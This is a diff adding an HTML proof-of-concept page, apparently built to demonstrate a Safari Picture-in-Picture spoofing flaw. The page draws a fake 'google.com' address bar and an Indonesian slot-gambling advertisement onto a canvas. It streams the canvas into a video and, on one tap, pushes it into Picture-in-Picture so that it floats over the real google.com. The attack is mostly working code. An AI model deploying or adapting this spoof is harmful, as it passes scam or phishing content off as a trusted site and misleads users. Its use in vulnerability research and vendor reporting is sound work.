@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC Safari - PiP Spoof Final</title>
+<style>
+  body{margin:0;background:#000;color:#fff;font-family:-apple-system,sans-serif;text-align:center}
+  canvas{width:100%;max-width:960px;display:block;margin:0 auto;cursor:pointer}
+  video{width:100%;max-width:960px;display:none;margin:0 auto;border:3px solid #0a84ff;border-radius:12px;cursor:pointer}
+  .hint{padding:12px;font-size:14px;color:#aaa;min-height:40px}
+  .badge{display:inline-block;background:#0a84ff;color:#fff;padding:6px 12px;border-radius:20px;font-size:12px;margin-top:8px}
+</style>
+</head>
+<body>
+
+<canvas id="c" width="960" height="540"></canvas>
+<video id="v" playsinline webkit-playsinline muted controls></video>
+<div class="hint" id="hint">Tap di sini untuk aktifkan PiP<br><span class="badge">1 Tap = PiP aktif</span></div>
+
+<script>
+var c=document.getElementById('c'), ctx=c.getContext('2d'), v=document.getElementById('v');
+var stream=null;
+var pipDone=false;
+
+function draw(){
+  ctx.fillStyle='#fff'; ctx.fillRect(0,0,960,70);
+  ctx.fillStyle='#000'; ctx.font='bold 22px sans-serif'; ctx.fillText('🔒 google.com • Video Highlight - Bola',16,45);
+  ctx.fillStyle='#ff0033'; ctx.fillRect(0,70,960,470);
+  ctx.fillStyle='#ffff00'; ctx.fillRect(24,96,912,96);
+  ctx.fillStyle='#000'; ctx.font='900 40px sans-serif'; ctx.textAlign='center'; ctx.fillText('SLOT GACOR 2026 - MAXWIN x1000',480,158);
+  ctx.textAlign='left'; ctx.fillStyle='#fff'; ctx.font='bold 26px sans-serif'; ctx.fillText('RTP 98.7% • Klik Daftar Sekarang!',40,250);
+  ctx.fillStyle='#00ff7f'; ctx.fillRect(40,280,300,64); ctx.fillStyle='#000'; ctx.fillText('DAFTAR',140,322);
+  var t=Date.now()/150; ctx.fillStyle='rgba(255,255,255,.7)'; for(let i=0;i<6;i++){ let x=(t*28 + i*170)%960; ctx.fillRect(x,380,70,10); }
+  requestAnimationFrame(draw);
+}
+draw();
+
+function init(){
+  try{
+    if(c.captureStream) stream=c.captureStream(30);
+    else if(c.webkitCaptureStream) stream=c.webkitCaptureStream(30);
+    else return false;
+    v.srcObject=stream;
+    v.style.display='block';
+    c.style.display='none';
+    v.muted=true;
+    v.play();
+    return true;
+  }catch(e){ return false; }
+}
+
+function goPiP(){
+  if(!stream) return;
+  try{
+    if(v.webkitSetPresentationMode) v.webkitSetPresentationMode('picture-in-picture');
+    else if(v.requestPictureInPicture) v.requestPictureInPicture();
+  }catch(e){}
+  if(!pipDone){
+    pipDone=true;
+    document.getElementById('hint').innerHTML = '✅ PiP aktif! Sekarang buka tab baru ke google.com → lihat PiP fake google.com tetap di atas google.com asli<br><span class="badge">Skenario valid Apple: PiP dulu, google kemudian</span>';
+  }
+}
+
+c.addEventListener('click', ()=>{
+  if(!stream) init();
+  setTimeout(goPiP,300);
+});
+v.addEventListener('click', goPiP);
+c.addEventListener('touchend', (e)=>{
+  e.preventDefault();
+  if(!stream) init();
+  setTimeout(goPiP,300);
+}, {passive:false});
+v.addEventListener('touchend', (e)=>{
+  e.preventDefault();
+  setTimeout(goPiP,80);
+}, {passive:false});
+</script>
+</body>
+</html>
